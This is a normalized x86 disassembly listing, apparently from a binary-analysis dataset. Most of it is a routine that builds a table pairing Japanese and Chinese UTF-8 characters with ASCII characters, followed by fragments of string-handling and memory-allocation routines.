lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8381e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3e
mov [ ebp - 0x4 ] 0x8581e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x21
mov [ ebp - 0x4 ] 0x8681e3
call sub_1003f500
mov [ eax ] 0x7e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8781e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x23
mov [ ebp - 0x4 ] 0x8981e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7c
mov [ ebp - 0x4 ] 0x8e81e3
call sub_1003f500
mov [ eax ] 0x5c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9081e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3b
mov [ ebp - 0x4 ] 0xba81e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2a
mov [ ebp - 0x4 ] 0xb981e3
call sub_1003f500
mov [ eax ] 0x5e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8a81e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x61
mov [ ebp - 0x4 ] 0x9881e3
push ecx
mov ecx rw-data
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x62
mov [ ebp - 0x4 ] 0x8481e3
call sub_1003f500
mov [ eax ] 0x63
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9581e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x64
mov [ ebp - 0x4 ] 0x9382e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x65
mov [ ebp - 0x4 ] 0xaf81e3
call sub_1003f500
mov [ eax ] 0x66
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8281e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x67
mov [ ebp - 0x4 ] 0x8f82e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x68
mov [ ebp - 0x4 ] 0x8782e3
call sub_1003f500
mov [ eax ] 0x69
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8082e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6a
mov [ ebp - 0x4 ] 0x9981e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6b
mov [ ebp - 0x4 ] 0xb381e3
call sub_1003f500
mov [ eax ] 0x6c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9282e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6d
mov [ ebp - 0x4 ] 0x8b81e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6e
mov [ ebp - 0x4 ] 0x9181e3
call sub_1003f500
mov [ eax ] 0x6f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xbe81e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x70
mov [ ebp - 0x4 ] 0x9781e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x71
mov [ ebp - 0x4 ] 0x9f81e3
call sub_1003f500
mov [ eax ] 0x72
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8280e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x73
mov [ ebp - 0x4 ] 0x9381e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x74
mov [ ebp - 0x4 ] 0x8d82e3
call sub_1003f500
mov [ eax ] 0x75
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8c81e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x76
mov [ ebp - 0x4 ] 0xa381e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x77
mov [ ebp - 0x4 ] 0xa681e3
call sub_1003f500
mov [ eax ] 0x78
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8a82e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x79
mov [ ebp - 0x4 ] 0x8c82e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7a
mov [ ebp - 0x4 ] 0xaa81e3
call sub_1003f500
mov [ eax ] 0x31
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xae81e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x32
mov [ ebp - 0x4 ] 0xab81e3
push ecx
mov ecx rw-data
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x33
mov [ ebp - 0x4 ] 0xa181e3
call sub_1003f500
mov [ eax ] 0x34
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8c80e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x35
mov [ ebp - 0x4 ] 0x8382e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x36
mov [ ebp - 0x4 ] 0x9e81e3
call sub_1003f500
mov [ eax ] 0x37
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8d80e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x38
mov [ ebp - 0x4 ] 0xa981e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x39
mov [ ebp - 0x4 ] 0x8282e3
call sub_1003f500
mov [ eax ] 0x30
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8d81e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2f
mov [ ebp - 0x4 ] 0x8b82e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3a
mov [ ebp - 0x4 ] 0xa881e3
call sub_1003f500
mov [ eax ] 0x2e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8180e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2d
mov [ ebp - 0x4 ] 0xad81e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3f
mov [ ebp - 0x4 ] 0x9a81e3
call sub_1003f500
mov [ eax ] 0x26
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8f81e3
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x5f
mov [ ebp - 0x4 ] 0x8181e3
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3d
mov [ ebp - 0x4 ] 0xacace7
call sub_1003f500
mov [ eax ] 0x3c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x80b8e4
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3e
mov [ ebp - 0x4 ] 0x809ce6
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x21
mov [ ebp - 0x4 ] 0x8cbee5
call sub_1003f500
mov [ eax ] 0x7e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8bb9e4
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x23
mov [ ebp - 0x4 ] 0x9abae4
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7c
mov [ ebp - 0x4 ] 0x9f93e5
call sub_1003f500
mov [ eax ] 0x5c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb6afe8
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3b
mov [ ebp - 0x4 ] 0x84bfe4
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2a
mov [ ebp - 0x4 ] 0x99b2e6
call sub_1003f500
mov [ eax ] 0x5e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9fb9e4
call sub_1003f500
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x61
mov [ ebp - 0x4 ] 0xb1a8e8
push ecx
mov ecx rw-data
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x62
mov [ ebp - 0x4 ] 0x8fb0e5
call sub_1003f500
mov [ eax ] 0x63
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb890e5
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x64
mov [ ebp - 0x4 ] 0x9985e7
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x65
mov [ ebp - 0x4 ] 0x8580e8
call sub_1003f500
mov [ eax ] 0x66
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb795e9
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x67
mov [ ebp - 0x4 ] 0x9a80e9
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x68
mov [ ebp - 0x4 ] 0xb1a9e8
call sub_1003f500
mov [ eax ] 0x69
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb89be7
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6a
mov [ ebp - 0x4 ] 0xb695e7
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6b
mov [ ebp - 0x4 ] 0x8ca1e8
call sub_1003f500
mov [ eax ] 0x6c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xba82e7
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6d
mov [ ebp - 0x4 ] 0xaaa6e8
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6e
mov [ ebp - 0x4 ] 0xa1bfe4
call sub_1003f500
mov [ eax ] 0x6f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x87abe8
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x70
mov [ ebp - 0x4 ] 0xb088e6
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x71
mov [ ebp - 0x4 ] 0x9183e6
call sub_1003f500
mov [ eax ] 0x72
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xad88e7
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x73
mov [ ebp - 0x4 ] 0xa6b5e7
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x74
mov [ ebp - 0x4 ] 0x88bae4
call sub_1003f500
mov [ eax ] 0x75
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9389e6
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x76
mov [ ebp - 0x4 ] 0xb08de5
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x77
mov [ ebp - 0x4 ] 0x9fa9e6
call sub_1003f500
mov [ eax ] 0x78
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8bb4e6
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x79
mov [ ebp - 0x4 ] 0x87b6e6
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7a
mov [ ebp - 0x4 ] 0x9cb5e6
call sub_1003f500
mov [ eax ] 0x31
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9081e6
call sub_1003f500
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x32
mov [ ebp - 0x4 ] 0xbc87e6
push ecx
mov ecx rw-data
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x33
mov [ ebp - 0x4 ] 0xb3aee5
call sub_1003f500
mov [ eax ] 0x34
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9580e6
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x35
mov [ ebp - 0x4 ] 0x849ae7
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x36
mov [ ebp - 0x4 ] 0x8785e5
call sub_1003f500
mov [ eax ] 0x37
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8b89e6
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x38
mov [ ebp - 0x4 ] 0xbdb1e6
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x39
mov [ ebp - 0x4 ] 0x8abbe8
call sub_1003f500
mov [ eax ] 0x30
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb49be7
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3a
mov [ ebp - 0x4 ] 0x878de5
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2f
mov [ ebp - 0x4 ] 0xb09ce5
call sub_1003f500
mov [ eax ] 0x2e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8bb8e4
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3f
mov [ ebp - 0x4 ] 0xaeaee5
call sub_1003f500
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x26
mov [ ebp - 0x4 ] 0xbc99e7
call sub_1003f500
mov [ eax ] 0x2d
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xa8a1e8
call sub_1003f500
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3d
mov [ ebp - 0x4 ] 0xb9a0e6
call sub_1003f500
mov [ eax ] 0x5f
mov esp ebp
pop ebp
retn
sub_10044570
cmp edx ebx
je r-xdata
retn
push esi
push edi
add edx 0x20
add eax 0x20
cmp edx ebx
jne r-xdata
mov ecx 0x8
mov esi edx
mov edi eax
[ edi ] [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
sub_10044592
push 0x3c
mov eax sub_10085776
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1006f961
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10002a9d
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_10034a80
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ edi ] esi
mov [ edi + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_10044663
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10044649
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_10044649
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_10044649
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_1002f519
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_100446b5
push 0x38
mov eax sub_1008581d
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1006f961
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10060ef0
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10034a80
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_10044770
push ebp
mov ebp esp
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi ] r--data
mov [ esi + 0x14 ] eax
cmp ebx edi
je r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
mov ebx [ lstrlenW@IAT ]
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0xc ] eax
call sub_1007f5d0
add esp 0xc
xor edi edi
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] edi
cmp [ ebp + 0x10 ] edi
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
push ebx
mov ebx [ lstrlenW@IAT ]
call ebx
lea edi [ eax + eax ]
lea edx [ edi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
push edi
push ecx
push eax
mov [ esi + 0x4 ] eax
call sub_1007f5d0
add esp 0xc
xor edi edi
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] edi
pop edi
mov eax esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x10 ]
cmp eax edi
je r-xdata
mov edx [ ebp + 0xc ]
push edx
call ebx
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp + 0xc ]
push edi
push ecx
push eax
mov [ esi + 0x8 ] eax
call sub_1007f5d0
add esp 0xc
xor edi edi
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
cmp [ ebp + 0xc ] edi
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
call ebx
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp + 0x10 ]
push edi
push ecx
push eax
mov [ esi + 0x10 ] eax
call sub_1007f5d0
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x10 ] edi
sub_100448b5
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10064836
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_10044960
push ebp
mov ebp esp
push 0xffffffff
push sub_100874e9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x14 ] esi
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
cmp ecx eax
je r-xdata
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] esi
mov [ ebx ] 0x0
mov [ ebp - 0x4 ] esi
mov esi [ edi ]
mov [ ebp - 0x14 ] 0x1
cmp esi [ edi + 0x4 ]
je r-xdata
push eax
call sub_100353e0
add esp 0x4
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ esi + 0x1c ]
mov [ ebp - 0x10 ] eax
add [ ebp - 0x10 ] 0x1c
add esi 0x1c
cmp esi [ edi + 0x4 ]
jne r-xdata
push 0x1
push r--data
mov ecx ebx
call sub_1002e070
push 0xffffffff
push 0x0
push esi
mov ecx ebx
call sub_1005e580
mov ecx [ ebp - 0x10 ]
cmp ecx [ edi + 0x4 ]
je r-xdata
sub_10044a50
push ebp
mov ebp esp
push 0xffffffff
push sub_10087e31
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x2
call sub_10023830
mov edi [ esi + 0x4 ]
cmp edi [ esi + 0x8 ]
je r-xdata
xor ebx ebx
mov ecx [ edi ]
xor ebx ebx
cmp ecx ebx
je r-xdata
xor ecx ecx
mov [ esi + 0x44 ] 0x7
mov [ esi + 0x40 ] ebx
mov [ esi + 0x30 ] cx
mov edi [ esi + 0x18 ]
cmp edi ebx
je r-xdata
mov eax [ esi + 0x30 ]
push eax
call sub_100187af
add esp 0x4
add edi 0x4
cmp edi [ esi + 0x8 ]
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push 0x1
call edx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov ebx [ esi + 0x1c ]
cmp edi ebx
je r-xdata
jmp r-xdata
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_100187af
add esp 0x4
mov ecx [ esi + 0x18 ]
push ecx
call sub_100187af
add esp 0x4
xor ebx ebx
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x44 ] 0x8
jb r-xdata
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] ax
add edi 0x24
cmp edi ebx
jne r-xdata
mov edx [ edi ]
push edx
call sub_100187af
add esp 0x4
sub_10044b50
push ebp
mov ebp esp
push 0xffffffff
push sub_10089d9d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x128 ] eax
mov [ ebp - 0x12c ] ecx
jne r-xdata
push 0x4
lea esi [ ebp - 0x120 ]
mov edi ebx
call sub_10057a60
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x84 ] al
call sub_10037e00
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x42
jmp r-xdata
push esi
lea eax [ ebp - 0x120 ]
call sub_100629b0
push eax
push ebx
lea edi [ ebp - 0x84 ]
call sub_10059c40
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_1002d84e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
push esi
push ebx
lea eax [ ebp - 0x120 ]
call sub_10064570
mov edx [ ebp - 0x128 ]
push edx
mov [ ebp - 0x130 ] eax
lea eax [ ebp - 0xbc ]
push r--data
push eax
call sub_100403d0
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_1002d84e
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x120 ]
call sub_100629b0
push eax
push ebx
